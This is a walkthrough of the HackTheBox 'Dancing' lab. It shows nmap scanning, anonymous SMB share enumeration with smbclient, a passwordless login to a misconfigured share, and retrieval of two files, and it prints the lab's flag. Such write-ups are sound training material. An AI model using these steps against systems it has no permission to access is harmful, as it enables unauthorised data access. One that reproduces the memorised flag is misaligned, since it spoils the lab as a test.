# Dancing
## Scope and Objective 
Target IP: 10.129.53.171  
Service: SMB  
Environment: HTB Pwnbox  

## About
Dancing is a very easy Windows machine which introduces the Server Message Block (SMB) protocol, its enumeration and its exploitation when misconfigured to allow access without a password.

| Lab | Platform | Difficulty |
| --- | --- | --- |
| Dancing | HackTheBox | Very Easy |

### Task 1
What does the 3-letter acronym SMB stand for?  
SMB stands for Server Message Block

### Task 2
What port does SMB use to operate at?  
SMB uses TCP port `445`

To find the service name for Port `445`, we perform the following Nmap scan:
```bash
$ nmap -sV 10.129.53.171
```
The response of the scan is shown below:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-20 02:38 EDT
Nmap scan report for 10.129.53.171
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.47 seconds
```
You can see that both port `445` and port `139` are open. SMB can operate on both ports, but in different ways. Port `139` is used for SMB over NetBIOS which is an older networking service that establishes and manages communication sessions between devices on a network. Port `445` is used by modern SMB to communicate directly over TCP/IP without requiring NetBIOS.  

Once we have discovered that SMB is running on the target, we can connect to the smbclient by running the following command:
```bash
$ smbclient -L 10.129.53.171
```
When prompted for a password, we simply leave it blank and hit `Enter` to tell the script to move along 
```bash
Password for [WORKGROUP\user]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```
As you can see, there are 4 different shares shown:
- `ADMIN$` is an administrative share used for remote administration of the Windows system. Access is normally restricted to administrators, making it worth checking whether our current account has permission to access it.
- `C$` is an administrative share that provides access to the system's C:\ drive, where Windows and other files are stored. It is also normally restricted to administrators.
- `IPC$` is Inter-Process Communication, which is a special share used for communication between processes over the network, and is not part of the file system.
- `WorkShares` is a custom share which may contain files or folders specifically intended to be shared with users on the network.

We will try to connect to all the shares except `IPC$`, which is not valuable since it is not browsable like a regular directory. First let us try the `ADMIN$` administrative share.
```bash
$ smbclient \\\\10.129.53.171\\ADMIN$
Password for [WORKGROUP\user]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
The `NT_STATUS_ACCESS_DENIED` is output, letting us know that we do not have the proper credentials to connect to this share. Lets try the `C$` administrative share.
```bash
$ smbclient \\\\10.129.53.171\\C$
Password for [WORKGROUP\user]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Once again we receive the `NT_STATUS_ACCESS_DENIED` output, so lets try the last custom `WorkShares` share.
```bash
$ smbclient \\\\10.129.53.171\\WorkShares
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> 
```
And it is successful! It is vulnerable and allowed us to log in without the proper credentials
Now we can browse through the directory, such as in Linux, we can use the command `ls` to list the files and directories inside the current working director.
```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1752908 blocks available
```
We can see that there are two directories, Amy.J and James.P. Let us visit Amy.J directory:

```bash
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

		5114111 blocks of size 4096. 1752908 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
We can see that there is a file called `worknotes.txt`, we can download this file to our local PC by using the `get` command. Now let us visit the James.P directory:
```bash
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

		5114111 blocks of size 4096. 1752908 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Navigating to it, we can see a file called `flag.txt`, we can retrieve this file by once again using the `get` command. Once finished we can exit the smbclient by using the `exit` command.  
Now Let us invetigate the two files we retrieved from the share. We can do so by using the `cat` command which will display the contents of the file.
```bash
$ cat worknotes.txt

- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing

$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```
The `worknotes.txt` file seems to be hinting at other vulnerable services which could be exploited. The `flag.txt` file however, which is what we are after, contains the flag to complete this lab. Congratulations!
